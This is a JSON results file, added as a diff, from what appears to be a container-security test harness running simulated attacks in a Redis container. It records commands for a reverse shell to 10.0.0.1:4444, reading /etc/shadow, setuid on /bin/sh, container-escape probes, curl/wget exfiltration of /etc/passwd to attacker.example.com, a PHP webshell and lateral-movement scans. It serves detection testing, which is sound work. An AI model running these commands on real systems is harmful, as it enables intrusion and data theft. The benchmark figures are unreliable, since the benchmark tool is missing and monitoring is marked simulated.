@@ -1,0 +1,274 @@
+{
+  "redis": {
+    "workload": "redis",
+    "timestamp": "2026-01-05T10:13:56.612351",
+    "container_config": {
+      "image": "redis:7-alpine",
+      "name": "wasmsentinel-redis",
+      "ports": {
+        "6379": "16379"
+      },
+      "env": {},
+      "command": null,
+      "healthcheck": "redis-cli ping",
+      "volumes": {}
+    },
+    "phases": {
+      "baseline": {
+        "elapsed_seconds": 0.004536867141723633,
+        "stdout": "",
+        "stderr": "/bin/sh: 1: redis-benchmark: not found\n",
+        "returncode": 127,
+        "stats_before": {
+          "cpu_percent": 0.36,
+          "memory": "4.145MiB / 125.7GiB",
+          "network": "3.25kB / 126B"
+        },
+        "stats_after": {
+          "cpu_percent": 0.37,
+          "memory": "4.145MiB / 125.7GiB",
+          "network": "3.79kB / 126B"
+        }
+      },
+      "monitored": {
+        "elapsed_seconds": 0.0008547306060791016,
+        "stdout": "",
+        "stderr": "/bin/sh: 1: redis-benchmark: not found\n",
+        "returncode": 127,
+        "stats_before": {
+          "cpu_percent": 0.31,
+          "memory": "4.145MiB / 125.7GiB",
+          "network": "4.06kB / 126B"
+        },
+        "stats_after": {
+          "cpu_percent": 0.27,
+          "memory": "4.395MiB / 125.7GiB",
+          "network": "4.24kB / 126B"
+        },
+        "monitoring": "simulated"
+      },
+      "attacks": {
+        "reverse_shell_attempt": {
+          "name": "Reverse Shell Attempt",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "bash -c \"exec 5<>/dev/tcp/10.0.0.1/4444 2>/dev/null\" || true",
+              "returncode": 0,
+              "elapsed_ms": 57.14821815490723,
+              "stdout": "",
+              "stderr": "sh: bash: not found\n"
+            },
+            {
+              "command": "python3 -c \"import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))\" 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 54.3828010559082,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "socket",
+            "connect",
+            "dup2",
+            "execve"
+          ]
+        },
+        "privilege_escalation": {
+          "name": "Privilege Escalation",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "sudo -n id 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 57.70468711853027,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "cat /etc/shadow 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 54.270267486572266,
+              "stdout": "root:*::0:::::\nbin:!::0:::::\ndaemon:!::0:::::\nlp:!::0:::::\nsync:!::0:::::\nshutdown:!::0:::::\nhalt:!::0:::::\nmail:!::0:::::\nnews:!::0:::::\nuucp:!::0:::::\ncron:!::0:::::\nftp:!::0:::::\nsshd:!::0:::::\ngam",
+              "stderr": ""
+            },
+            {
+              "command": "chmod u+s /bin/sh 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 70.87898254394531,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "setuid",
+            "setgid",
+            "execve",
+            "openat"
+          ]
+        },
+        "container_escape": {
+          "name": "Container Escape Attempt",
+          "severity": "critical",
+          "commands": [
+            {
+              "command": "cat /proc/1/cgroup 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 53.58695983886719,
+              "stdout": "0::/\n",
+              "stderr": ""
+            },
+            {
+              "command": "ls -la /var/run/docker.sock 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 59.80801582336426,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "mount --bind / /mnt 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 56.05340003967285,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "mount",
+            "pivot_root"
+          ]
+        },
+        "data_exfiltration": {
+          "name": "Data Exfiltration",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "curl -s http://attacker.example.com/exfil -d @/etc/passwd 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 50.18758773803711,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "wget -q --post-file=/etc/passwd http://attacker.example.com/ 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 60.65559387207031,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "read",
+            "socket",
+            "connect",
+            "sendto"
+          ]
+        },
+        "cryptominer_behavior": {
+          "name": "Cryptominer Behavior",
+          "severity": "medium",
+          "commands": [
+            {
+              "command": "dd if=/dev/zero of=/dev/null bs=1M count=1000 2>/dev/null &",
+              "returncode": 0,
+              "elapsed_ms": 63.63964080810547,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "for i in $(seq 1 4); do sha256sum /dev/zero & done; sleep 5; pkill sha256sum 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 5066.258668899536,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "clone",
+            "sched_setaffinity",
+            "read",
+            "write"
+          ]
+        },
+        "webshell_upload": {
+          "name": "Webshell Upload Simulation",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "echo \"<?php system($_GET[cmd]); ?>\" > /tmp/shell.php 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 68.30739974975586,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "curl -X POST -F \"file=@/tmp/shell.php\" http://localhost/ 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 77.35109329223633,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "openat",
+            "write",
+            "socket",
+            "sendto"
+          ]
+        },
+        "lateral_movement": {
+          "name": "Lateral Movement",
+          "severity": "high",
+          "commands": [
+            {
+              "command": "ping -c 1 172.17.0.1 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 57.0979118347168,
+              "stdout": "PING 172.17.0.1 (172.17.0.1): 56 data bytes\n64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.073 ms\n\n--- 172.17.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-tri",
+              "stderr": ""
+            },
+            {
+              "command": "nmap -sP 172.17.0.0/24 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 63.10558319091797,
+              "stdout": "",
+              "stderr": ""
+            },
+            {
+              "command": "ssh -o ConnectTimeout=1 root@172.17.0.2 2>/dev/null || true",
+              "returncode": 0,
+              "elapsed_ms": 59.862613677978516,
+              "stdout": "",
+              "stderr": ""
+            }
+          ],
+          "expected_syscalls": [
+            "socket",
+            "connect",
+            "sendto",
+            "recvfrom"
+          ]
+        }
+      },
+      "overhead": {
+        "cpu_samples": [
+          0.32,
+          0.3,
+          0.27,
+          0.32,
+          0.32,
+          0.3,
+          0.29,
+          0.3,
+          0.35,
+          0.31
+        ],
+        "cpu_mean": 0.308,
+        "cpu_stdev": 0.021499353995462794
+      }
+    },
+    "overhead_percent": -81.16033422670661
+  }
+}
